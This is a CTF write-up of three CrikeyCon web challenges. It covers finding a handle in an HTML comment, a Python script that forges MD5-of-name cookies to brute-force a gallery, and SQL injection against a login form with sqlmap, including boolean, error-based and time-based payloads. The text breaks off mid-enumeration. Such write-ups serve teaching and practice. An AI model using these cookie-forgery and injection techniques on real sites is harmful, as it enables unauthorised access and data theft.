# CTF-Writeups

## CrikeyConCTF Crapto Locker (100pts)
---
The following web page was left by a hacker, who is using ransomware to hold my web site hostage. I am a poor student and can't affort to pay the ransom. Can you help?

http://ctf.crikeycon.com:1234
The 1st step of this challenge is to identify the hacker.
Submit the flag as: flag{hacker_handle}



Source Code

```html
HTTP/1.1 200 OK
Date: Wed, 22 Mar 2017 12:27:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 17 Feb 2017 09:23:36 GMT
ETag: "26d-548b677e60abe"
Accept-Ranges: bytes
Content-Length: 621
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

<html><head></style><audio autoplay loop><source src="./Saw theme song.mp3" type="audio/mpeg"></audio>
<title>Cr@pT0l0cK3r</title></head><body background="./matrix-animated-image.gif"></body><center><h1 style=color:red;>U h@v3 b33n h1T by Cr@pT0l0cK3r!</h1><h2 style=color:green;>P@y 1.337 dr0pco1ns 2 @cc0unT: 5318008 1n 1 w33k t0 g3T ur d@T@z b@cK!</h4><img  src="./Hacker.png"><h3 style=color:grey; >*****i l0cK3d ur cr@p******</h1><p style=color:grey; >Gr33Tz to--> TrumpLuV3r, m0l3z, s1Lv10, k0aLaz, Joey Jojo Jr Shabadoo, Team-Barbie, Team Blue Ballz, ASD </p></center><!-- Page made by dr0ppyb3@r_h@ck3r -></html>
```

Searching through the source of the compromised website revealed the following commented section:
```html
<!-- Page made by dr0ppyb3@r_h@ck3r ->
```

flag{dr0ppyb3@r_h@ck3r}



## CrikeyConCTF Koala Web Challenge (200pts)
---
Get the flag from this fine collection of bears.

http://ctf.crikeycon.com:8001

```html
GET / HTTP/1.1
Host: ctf.crikeycon.com:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: session=.eJwNz0FrgzAUwPGvMt7Zg0a9CIN1yyYWXsQuJbzc7HTVF2OhZaSk9LvP05_f8f-AfvDzCtVvv9zGBOYBqiwrElgv688I1QNeTlAByk5Yfp-JD94aKpB3GXGXIp9LlBOTIUGmK1DsudWYElOpDKZWYrSaAmrMW7kspF2pJObWd3esG6HiuSB_DG39GYh3gvSXt1o5jPsJa-vQKG5Nk6l4LFvpctJN2BqUbkry1pFQk6oPvPmO7KKV9ArPBP5u43Xt_TYAmcrfPq6XMHxP87gM8PwHo-ZOmQ.C7Nn6A.CbLr-jbU3clK_zeFZZVfeN5GvhM; KoalaCookie=9f9d51bc70ef21ca5c14f307980a29d8
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Wed, 22 Mar 2017 02:16:45 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: KoalaCookie=527bd5b5d689e2c32ae974c6229ff785
Vary: Accept-Encoding
Content-Length: 901
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>
```


```
root@blackhat:/pentest/lists/passwords# echo "bob" | md5sum
e01096b9ffe3f416157f6ec46c467725  -
```


```python
### CrikeyCon CTF Koala Gallery Exploit by 1N3@CrowdShield
### https://crowdshield.com 

import hashlib
import requests
import time

name = [ "bob", "dave", "jane", "tony", "sarah", "mary", "frank", "droppy", "laura", "john", "emma", "carl" ]
num = len(name)

target = open("/tmp/hash.out", 'w')
target.truncate()

for i in range(num):
    print name[i]+ " = " + (hashlib.md5(name[i].encode('utf-8')).hexdigest())
    target.write(hashlib.md5(name[i].encode('utf-8')).hexdigest())
    target.write("\n")
    print "===================================== >"
    print "GET http://ctf.crikeycon.com:8001 HTTP/1.1"
    print "Host: ctf.crikeycon.com"
    cookie=(hashlib.md5(name[i].encode('utf-8')).hexdigest())
    print "Cookie: KoalaCookie=" +cookie
    cookies = dict(KoalaCookie=cookie)
    req = requests.get("http://ctf.crikeycon.com:8001/", cookies=cookies)
    print (req.request.headers)
    print "< ====================================="
    print (req.headers)
    print "< ====================================="
    print(req.text)
    print "\n\n"
    if 'flag' in req.text:
        print "Success!"
        break
        exit
    else:
        print "No flag found."
    print "\n\n\n\n"
    time.sleep(3)
    
```




```html
root@blackhat:/pentest/development/python# python md5sum.py 
bob = 9f9d51bc70ef21ca5c14f307980a29d8
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=9f9d51bc70ef21ca5c14f307980a29d8
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=9f9d51bc70ef21ca5c14f307980a29d8', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=5844a15e76563fedd11840fd6f40ea7b', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:37 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





dave = 1610838743cc90e3e4fdda748282d9b8
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=1610838743cc90e3e4fdda748282d9b8
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=1610838743cc90e3e4fdda748282d9b8', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=9f9d51bc70ef21ca5c14f307980a29d8', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:40 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





jane = 5844a15e76563fedd11840fd6f40ea7b
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=5844a15e76563fedd11840fd6f40ea7b
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=5844a15e76563fedd11840fd6f40ea7b', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=1610838743cc90e3e4fdda748282d9b8', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:44 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





tony = ddc5f5e86d2f85e1b1ff763aff13ce0a
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=ddc5f5e86d2f85e1b1ff763aff13ce0a
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=ddc5f5e86d2f85e1b1ff763aff13ce0a', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=527bd5b5d689e2c32ae974c6229ff785', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:47 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





sarah = 9e9d7a08e048e9d604b79460b54969c3
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=9e9d7a08e048e9d604b79460b54969c3
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=9e9d7a08e048e9d604b79460b54969c3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=5844a15e76563fedd11840fd6f40ea7b', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:51 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





mary = b8e7be5dfa2ce0714d21dcfc7d72382c
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=b8e7be5dfa2ce0714d21dcfc7d72382c
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=b8e7be5dfa2ce0714d21dcfc7d72382c', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=9e9d7a08e048e9d604b79460b54969c3', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:54 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





frank = 26253c50741faa9c2e2b836773c69fe6
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=26253c50741faa9c2e2b836773c69fe6
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=26253c50741faa9c2e2b836773c69fe6', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '244', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=527bd5b5d689e2c32ae974c6229ff785', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:34:58 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




No flag found.





droppy = d21e15ab5a164b251d09e315893946b4
=====================================>
GET http://ctf.crikeycon.com:8001 HTTP/1.1
Host: ctf.crikeycon.com
Cookie: KoalaCookie=d21e15ab5a164b251d09e315893946b4
{'Connection': 'keep-alive', 'Cookie': 'KoalaCookie=d21e15ab5a164b251d09e315893946b4', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.13.0'}
<=====================================
{'Content-Length': '267', 'Content-Encoding': 'gzip', 'Set-Cookie': 'KoalaCookie=00a809937eddc44521da9521269e75c6', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.18 (Ubuntu)', 'Connection': 'Keep-Alive', 'Date': 'Thu, 23 Mar 2017 06:35:01 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
<=====================================
Koala Gallery - flag{dr0ppy_the_dr0pb34r}<html>
<body>
<center>
<h2>Koala Gallery</h2>
<img src="bob.jpg" alt="Bob" style="width:250px;height:250px;">
<img src="dave.jpg" alt="Dave" style="width:250px;height:250px;">
<img src="jane.jpg" alt="Jane" style="width:250px;height:250px;">
<img src="tony.jpg" alt="Tony" style="width:250px;height:250px;">
<p>
<img src="sarah.jpg" alt="Sarah" style="width:250px;height:250px;">
<img src="mary.jpg" alt="Mary" style="width:250px;height:250px;">
<img src="frank.jpg" alt="Frank" style="width:250px;height:250px;">
<img src="droppy.jpg" alt="Droppy" style="width:250px;height:250px;">
<p>
<img src="laura.jpg" alt="Laura" style="width:250px;height:250px;">
<img src="john.jpg" alt="John" style="width:250px;height:250px;">
<img src="emma.jpg" alt="Emma" style="width:250px;height:250px;">
<img src="carl.jpg" alt="Carl" style="width:250px;height:250px;">
</center>
</body>
</html>




Success!
```



flag{dr0ppy_the_dr0pb34r}





## CrikeyConCTF Eyeless Web Challenge (200pts)
---
Retrieve the admin password

http://ctf.crikeycon.com:8003


### SQLi Fuzzing

```html
POST / HTTP/1.1
Host: ctf.crikeycon.com:8003
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://ctf.crikeycon.com:8003/
Cookie: connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI; session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2Gc
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=%27&password=&login=Submit+Query

HTTP/1.1 200 OK
Date: Wed, 22 Mar 2017 12:13:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 167
Connection: close
Content-Type: text/html; charset=UTF-8

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' AND password = ''' at line 1

```




### SQLMap Exploitation

```html
root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.1.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:14:49

[22:14:49] [WARNING] it appears that you have provided tainted parameter values ('username='') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:14:56] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:14:56] [INFO] resuming back-end DBMS 'mysql' 
[22:14:56] [INFO] testing connection to the target URL
[22:14:57] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: password=-2518' OR 9960=9960#&login=login=&username=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: password=' OR (SELECT 1455 FROM(SELECT COUNT(*),CONCAT(0x7170767071,(SELECT (ELT(1455=1455,1))),0x717a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DWAo&login=login=&username=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: password=' OR SLEEP(5)-- NGfN&login=login=&username=
---
[22:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[22:14:57] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf.crikeycon.com'

[*] shutting down at 22:14:57




root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;' --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.1.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:15:38

[22:15:38] [WARNING] it appears that you have provided tainted parameter values ('username='') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:15:39] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:15:39] [INFO] resuming back-end DBMS 'mysql' 
[22:15:39] [INFO] testing connection to the target URL
[22:15:55] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: password=-2518' OR 9960=9960#&login=login=&username=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: password=' OR (SELECT 1455 FROM(SELECT COUNT(*),CONCAT(0x7170767071,(SELECT (ELT(1455=1455,1))),0x717a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DWAo&login=login=&username=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: password=' OR SLEEP(5)-- NGfN&login=login=&username=
---
[22:15:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[22:15:55] [INFO] fetching database names
[22:15:55] [INFO] the SQL query used returns 5 entries
[22:15:55] [INFO] resumed: information_schema
[22:15:55] [INFO] resumed: ctf
[22:15:55] [INFO] resumed: mysql
[22:15:55] [INFO] resumed: performance_schema
[22:15:55] [INFO] resumed: sys
available databases [5]:
[*] ctf
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[22:15:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf.crikeycon.com'

[*] shutting down at 22:15:55





root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;' -D ctf --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.1.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:16:24

[22:16:24] [WARNING] it appears that you have provided tainted parameter values ('username='') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:16:25] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:16:25] [INFO] resuming back-end DBMS 'mysql' 
[22:16:25] [INFO] testing connection to the target URL
[22:16:26] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: password=-2518' OR 9960=9960#&login=login=&username=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: password=' OR (SELECT 1455 FROM(SELECT COUNT(*),CONCAT(0x7170767071,(SELECT (ELT(1455=1455,1))),0x717a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DWAo&login=login=&username=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: password=' OR SLEEP(5)-- NGfN&login=login=&username=
---
[22:16:26] [INFO] the back-end DBMS is MySQL
